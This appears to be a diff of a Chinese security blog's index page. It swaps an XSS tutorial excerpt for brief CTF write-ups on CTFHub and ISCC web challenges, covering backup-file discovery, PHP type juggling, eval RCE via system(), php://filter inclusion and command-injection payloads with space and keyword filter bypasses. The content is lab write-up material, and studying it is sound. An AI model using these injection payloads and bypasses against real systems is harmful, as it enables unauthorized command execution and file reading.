-<p><img src="/../images/8.png"></p>
-<p>我们查看源码</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;vulnerable_code_area&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">		<span class="tag">&lt;<span class="name">p</span>&gt;</span>Please choose a language:<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">&quot;XSS&quot;</span> <span class="attr">method</span>=<span class="string">&quot;GET&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">&quot;default&quot;</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">				<span class="keyword">if</span> (<span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;default=&quot;</span>) &gt;= <span class="number">0</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">					<span class="keyword">var</span> lang = <span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>.<span class="title function_">substring</span>(<span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;default=&quot;</span>)+<span class="number">8</span>);</span></span><br><span class="line"><span class="language-javascript">					<span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;option value=&#x27;&quot;</span> + lang + <span class="string">&quot;&#x27;&gt;&quot;</span> + <span class="built_in">decodeURI</span>(lang) + <span class="string">&quot;&lt;/option&gt;&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">					<span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;option value=&#x27;&#x27; disabled=&#x27;disabled&#x27;&gt;----&lt;/option&gt;&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">				&#125;</span></span><br><span class="line"><span class="language-javascript">				    </span></span><br><span class="line"><span class="language-javascript">				<span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;option value=&#x27;English&#x27;&gt;English&lt;/option&gt;&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">				<span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;option value=&#x27;French&#x27;&gt;French&lt;/option&gt;&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">				<span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;option value=&#x27;Spanish&#x27;&gt;Spanish&lt;/option&gt;&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">				<span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;option value=&#x27;German&#x27;&gt;German&lt;/option&gt;&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">			</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Select&quot;</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>可以看到是直接用document.write 等函数将数据输出到web页面上。</p>
-<h2 id="xss漏洞防范"><a href="#xss漏洞防范" class="headerlink" title="xss漏洞防范"></a>xss漏洞防范</h2><p>1、HTML 实体编码</p>
-<p>2、使用白名单过滤掉用户输入的恶意字符</p>
-<p>这里详细参考大佬链接：</p>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/csnd/p/11807592.html">https://www.cnblogs.com/csnd/p/11807592.html</a></p>
+<p>用Linux环境打开</p>
+<p>vim -r index.php.swp</p>
 
       
 
@@ -404,7 +352,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2022/04/26/XSS%E6%BC%8F%E6%B4%9E%E5%85%A5%E9%97%A8/">展开全文 >></a>
+          <a class="article-more-a" href="/2022/05/29/ctfhub%20vim/">展开全文 >></a>
         </p>
       
 
@@ -434,6 +382,370 @@
 
 
   
+    <article id="post-ctfhub bak文件" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="ctfhub-bak文件"><a href="#ctfhub-bak文件" class="headerlink" title="ctfhub bak文件"></a>ctfhub bak文件</h1><p>用dirsearch跑一下</p>
+<p>看到index.php.bak</p>
+<p>打开得到flag</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2022/05/29/ctfhub%20bak%E6%96%87%E4%BB%B6/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-iscc闯关题web1" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="iscc闯关题web1"><a href="#iscc闯关题web1" class="headerlink" title="iscc闯关题web1"></a>iscc闯关题web1</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$Step1</span>=False;</span><br><span class="line"><span class="variable">$Step2</span>=False;</span><br><span class="line"></span><br><span class="line"><span class="variable">$info</span>=(<span class="keyword">array</span>)<span class="title function_ invoke__">json_decode</span>(@<span class="variable">$_GET</span>[<span class="string">&#x27;Information&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$info</span>))&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$info</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">is_numeric</span>(@<span class="variable">$info</span>[<span class="string">&quot;year&quot;</span>])?<span class="keyword">die</span>(<span class="string">&quot;Sorry~&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span>(@<span class="variable">$info</span>[<span class="string">&quot;year&quot;</span>])&#123;</span><br><span class="line">        (<span class="variable">$info</span>[<span class="string">&quot;year&quot;</span>]=<span class="number">2022</span>)?<span class="variable">$Step1</span>=True:<span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(@<span class="variable">$info</span>[<span class="string">&quot;items&quot;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">is_array</span>(<span class="variable">$info</span>[<span class="string">&quot;items&quot;</span>][<span class="number">1</span>])OR <span class="title function_ invoke__">count</span>(<span class="variable">$info</span>[<span class="string">&quot;items&quot;</span>])!==<span class="number">3</span> ) <span class="keyword">die</span>(<span class="string">&quot;Sorry~&quot;</span>);</span><br><span class="line">        <span class="variable">$status</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;skiing&quot;</span>, <span class="variable">$info</span>[<span class="string">&quot;items&quot;</span>]);</span><br><span class="line">        <span class="variable">$status</span>===<span class="literal">false</span>?<span class="keyword">die</span>(<span class="string">&quot;Sorry~&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$info</span>[<span class="string">&quot;items&quot;</span>] <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$val</span>)&#123;</span><br><span class="line">            <span class="variable">$val</span>===<span class="string">&quot;skiing&quot;</span>?<span class="keyword">die</span>(<span class="string">&quot;Sorry~&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$Step2</span>=True;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$Step1</span> &amp;&amp; <span class="variable">$Step2</span>)&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;2022flag.php&quot;</span>;<span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>审计源码</p>
+<p>传参js加密后数组Information</p>
+<p>数组year和items两个变量</p>
+<p>year不能为数字</p>
+<p>items为数组，必须有三个元素且第二个元素为数组</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$status</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;skiing&quot;</span>, <span class="variable">$info</span>[<span class="string">&quot;items&quot;</span>]);</span><br><span class="line">        <span class="variable">$status</span>===<span class="literal">false</span>?<span class="keyword">die</span>(<span class="string">&quot;Sorry~&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$info</span>[<span class="string">&quot;items&quot;</span>] <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$val</span>)&#123;</span><br><span class="line">            <span class="variable">$val</span>===<span class="string">&quot;skiing&quot;</span>?<span class="keyword">die</span>(<span class="string">&quot;Sorry~&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        &#125; </span><br></pre></td></tr></table></figure>
+
+<p>同时array_search函数必须返回true同时items里不能有skiing这个字符串</p>
+<p>若比较string&#x3D;&#x3D;0，可以用0绕过</p>
+<p>构造payloa</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxxxxx/?Information=&#123;&quot;year&quot;:&quot;a&quot;,&quot;items&quot;:[0,[&quot;123123&quot;],3]&#125;</span><br></pre></td></tr></table></figure>
+
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2022/05/25/iscc%E9%97%AF%E5%85%B3%E9%A2%98web1/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-ctfhub rce eval执行" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="ctfhub-rce-eval执行"><a href="#ctfhub-rce-eval执行" class="headerlink" title="ctfhub rce eval执行"></a>ctfhub rce eval执行</h1><p>?cmd&#x3D;system(‘ls &#x2F;‘);</p>
+<p>?cmd&#x3D;system(‘cat &#x2F; flag_231’)</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2022/05/23/ctfhub%20rce%20eval%E6%89%A7%E8%A1%8C/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-ctfhub rce 读取源代码" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="ctfhub-rce-读取源代码"><a href="#ctfhub-rce-读取源代码" class="headerlink" title="ctfhub rce 读取源代码"></a>ctfhub rce 读取源代码</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxxxxxx/?file=php://filter/resource=/flag</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="title function_ invoke__">substr</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>], <span class="number">0</span>, <span class="number">6</span>) === <span class="string">&quot;php://&quot;</span> ) &#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;hr&gt;</span><br><span class="line">i don<span class="string">&#x27;t have shell, how to get flag? &lt;br&gt;</span></span><br><span class="line"><span class="string">flag in &lt;code&gt;/flag&lt;/code&gt; i don&#x27;</span>t have shell, how to get flag?</span><br><span class="line">flag in /flag</span><br></pre></td></tr></table></figure>
+
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2022/05/23/ctfhub%20rce%20%E8%AF%BB%E5%8F%96%E6%BA%90%E4%BB%A3%E7%A0%81/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-ctfhub rce 命令注入过滤空格" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="ctfhub-rce-命令注入过滤空格"><a href="#ctfhub-rce-命令注入过滤空格" class="headerlink" title="ctfhub rce 命令注入过滤空格"></a>ctfhub rce 命令注入过滤空格</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1|cat&lt;flag_297492904330284.php|base64</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">过滤空格绕过</span><br><span class="line">%09（url传递）</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$9</span><br><span class="line">&lt;&gt;</span><br><span class="line">&lt;</span><br><span class="line">&#123;cat,flag&#125;</span><br></pre></td></tr></table></figure>
+
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2022/05/22/ctfhub%20rce%20%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-ctfhub rce 命令注入过滤cat" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="ctfhub-rce-命令注入过滤cat"><a href="#ctfhub-rce-命令注入过滤cat" class="headerlink" title="ctfhub rce 命令注入过滤cat"></a>ctfhub rce 命令注入过滤cat</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&amp;ca\t *flag_1450220120038.php | base64</span><br></pre></td></tr></table></figure>
+
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2022/05/22/ctfhub%20rce%20%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E8%BF%87%E6%BB%A4cat/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-ctfhub rce 命令注入" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip &amp; cat *.php | base64</span><br></pre></td></tr></table></figure>
+
+<h1 id="ctfhub-rce-命令注入"><a href="#ctfhub-rce-命令注入" class="headerlink" title="ctfhub rce 命令注入"></a>ctfhub rce 命令注入</h1>
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2022/05/22/ctfhub%20rce%20%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+  
+    <nav id="page-nav">
+      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
+    </nav>
   
 
 
